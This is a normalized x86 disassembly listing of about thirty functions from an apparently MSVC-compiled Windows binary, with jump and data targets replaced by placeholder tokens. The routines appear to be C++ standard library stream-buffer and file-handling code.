call sub_414a00
sub_413730
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x12 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_401a60
push eax
lea ecx [ ebp - 0x5 ]
call sub_401d60
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
call sub_414960
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x10 ]
cmp [ eax + ecx * 4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
call sub_4134f0
movzx ecx al
test ecx ecx
jne r-xdata
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
push ecx
lea ecx [ ebp - 0x5 ]
call sub_401d80
jmp r-xdata
push 0x1
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov edx [ eax + ecx * 4 ]
push edx
lea eax [ ebp - 0x11 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_401a60
mov ecx eax
call sub_401d80
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x10 ]
lea ecx [ edx + eax * 4 ]
push ecx
lea edx [ ebp - 0x13 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_401a60
mov ecx eax
call sub_402160
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
sub_413840
push ebp
mov ebp esp
push 0xffffffff
push sub_43b278
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_4143f0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x10 ]
call sub_413a10
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_4138b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4138e0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bb18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_421e14
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
push 0x1
mov ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x10 ]
call sub_413a10
lea edx [ ebp - 0x20 ]
push edx
mov ecx [ ebp - 0x10 ]
call sub_414450
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ecx
call sub_416a20
add esp 0x4
push eax
mov ecx [ ebp - 0x10 ]
call sub_413cd0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_40d130
mov eax [ ebp - 0x10 ]
sub_4139a0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
call sub_413ac0
movzx edx al
test edx edx
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x50 ]
push ecx
call sub_4232da
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x0
push 0x2
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_413a10
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x0
sub_413a10
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ edx + 0x50 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] 0x0
mov esp ebp
pop ebp
retn 0x8
mov eax 0x1
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ ebp - 0x8 ]
mov [ eax + 0x4c ] cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x45 ] 0x0
mov ecx [ ebp - 0x4 ]
call sub_4144d0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
add eax 0x4
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
add ecx 0x4
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_414540
sub_413ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b998
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x30 ] ecx
mov eax [ ebp - 0x30 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp - 0x30 ]
movzx edx [ ecx + 0x45 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov [ ebp - 0x54 ] 0x8
call sub_40cb50
push eax
mov eax [ ebp - 0x30 ]
mov edx [ eax ]
mov ecx [ ebp - 0x30 ]
mov eax [ edx + 0xc ]
call eax
mov [ ebp - 0x40 ] eax
call sub_40cb50
mov [ ebp - 0x44 ] eax
lea ecx [ ebp - 0x40 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x28 ]
call sub_412240
mov [ ebp - 0x4 ] 0x0
xor al al
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ eax + 0x45 ] 0x0
cmp [ ebp - 0x3c ] 0x1
je r-xdata
mov ecx [ ebp - 0x30 ]
movzx edx [ ecx + 0x45 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x50 ]
push ecx
mov edx [ ebp - 0x38 ]
push edx
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4123e0
mov ecx eax
call sub_413dd0
push eax
call sub_422d75
add esp 0x10
cmp [ ebp - 0x38 ] eax
je r-xdata
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_4123e0
mov ecx eax
call sub_413dd0
mov edx [ ebp - 0x2c ]
sub edx eax
mov [ ebp - 0x38 ] edx
je r-xdata
cmp [ ebp - 0x3c ] 0x3
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x31 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov al [ ebp - 0x31 ]
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov al [ ebp - 0x34 ]
jmp r-xdata
mov [ ebp - 0x33 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov al [ ebp - 0x33 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x28 ]
call sub_412330
mov [ ebp - 0x32 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov al [ ebp - 0x32 ]
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x58 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_4123e0
mov ecx eax
call sub_413dd0
mov esi eax
lea ecx [ ebp - 0x28 ]
call sub_401890
add esi eax
push esi
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4123e0
mov ecx eax
call sub_413dd0
push eax
mov ecx [ ebp - 0x30 ]
add ecx 0x48
push ecx
mov edx [ ebp - 0x30 ]
mov ecx [ edx + 0x40 ]
call sub_414d80
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
je r-xdata
sub_413cd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40d2d0
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ edx + 0x40 ] eax
mov ecx [ ebp - 0x4 ]
call sub_4144d0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] 0x0
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_413d10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_412e00
mov ecx [ ebp - 0x4 ]
add ecx 0x44
cmp eax ecx
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x3c ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x3c ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_414490
sub_413d50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_412e00
mov ecx [ ebp - 0x4 ]
add ecx 0x44
cmp eax ecx
je r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x45
push edx
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x44
push ecx
mov ecx [ ebp - 0x4 ]
call sub_414490
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
call sub_412e00
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov ecx [ ebp - 0x4 ]
call sub_412e60
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x3c ] eax
sub_413df0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b5b8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_412cb0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x8 ]
add ecx [ edx + 0x4 ]
call sub_40dab0
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40dab0
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x4 ] al
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x8 ]
add ecx [ edx + 0x4 ]
call sub_4143d0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_4143d0
mov ecx eax
call sub_4105b0
sub_413ea0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
call j_sub_42706d
movzx eax al
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
call sub_410800
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
call sub_4142f0
sub_413ed0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov [ eax + 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_413f10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp + 0x10 ]
mov [ ecx + 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
sub_413f70
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax ]
add edx [ ecx + 0x8 ]
mov esi [ eax + 0x4 ]
adc esi [ ecx + 0xc ]
mov eax edx
mov edx esi
pop esi
mov esp ebp
pop ebp
retn
sub_413fa0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
call eax
mov esp ebp
pop ebp
retn 0x1c
sub_413fe0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x1c ]
call eax
mov esp ebp
pop ebp
retn 0x1c
sub_414050
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov edx [ ebp + 0x20 ]
mov eax [ ebp + 0x18 ]
mov [ edx ] eax
mov ecx 0x1
test ecx ecx
je r-xdata
jmp r-xdata
mov eax 0x3
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov esp ebp
pop ebp
retn 0x1c
xor eax eax
mov ecx [ ebp + 0x20 ]
mov edx [ ecx ]
cmp edx [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebp + 0x20 ]
mov eax [ edx ]
mov cl [ ecx ]
mov [ eax ] cl
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp + 0x20 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x20 ]
mov [ ecx ] eax
sub_4140f0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
mov edx [ ebp + 0x10 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
sub_414160
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_414020
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_414190
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_402000
movzx ecx al
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ r--data ]
sub ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0xc ]
ja r-xdata
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov ecx [ ebp + 0x8 ]
sub ecx eax
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_414e10
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx edx al
test edx edx
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x10 ]
push eax
call sub_401070
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401c30
sub_414240
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
cmp eax [ r--data ]
jne r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx edx al
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_4142a0
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
sub_4142a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x1
jne r-xdata
movzx ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_40ca90
add esp 0xc
lea eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_4010d0
add esp 0x8
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
sub_4142f0
push ebp
mov ebp esp
push 0xffffffff
push sub_43ba60
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ebp - 0x18 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40dab0
mov [ ebp - 0x11 ] al
movzx eax [ ebp - 0x11 ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x18 ]
add ecx [ edx + 0x4 ]
call sub_40db00
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
and eax 0x2
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x18 ]
add ecx [ edx + 0x4 ]
call sub_4106c0
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
call sub_412d10
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
push 0x4
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ebp - 0x18 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_410690
sub_4143f0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
push 0x4
call sub_42257f
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
call sub_40dd70
mov ecx [ ebp - 0x8 ]
call sub_40d110
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x34 ] edx
mov ecx [ ebp - 0x4 ]
call sub_4144d0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_414450
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x34 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40d0e0
mov edx [ ebp - 0x4 ]
or edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_414490
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ ecx ] edx
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x2c ]
mov [ edx ] eax
mov esp ebp
pop ebp
retn 0xc
sub_4144d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] eax
mov edx [ ebp - 0x4 ]
add edx 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x14
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x18
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp - 0x4 ]
add edx 0x24
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x28
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] ecx
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_414ed0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_414490
mov esp ebp
pop ebp
retn
sub_414540
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x20 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
mov [ edx + 0x2c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x1c ]
mov [ ecx + 0x30 ] edx
mov esp ebp
pop ebp
retn 0x18
sub_4145b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_414fe0
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_4145d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414f10
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_414600
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_414590
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_414f10
mov ecx eax
call sub_411e00
movzx edx al
test edx edx
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_40e0b0
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_414f30
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
lea ecx [ ebp - 0x8 ]
call sub_414db0
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_414590
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
sub_414690
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_414f50
mov ecx [ ebp - 0x4 ]
and eax [ ecx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
shr edx 0x1
add edx 0x1
mov eax [ ebp - 0x8 ]
sub eax edx
mov [ ebp - 0x8 ] eax
sub_4146e0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x1 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_414fa0
mov ecx eax
call sub_414f80
movzx eax al
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
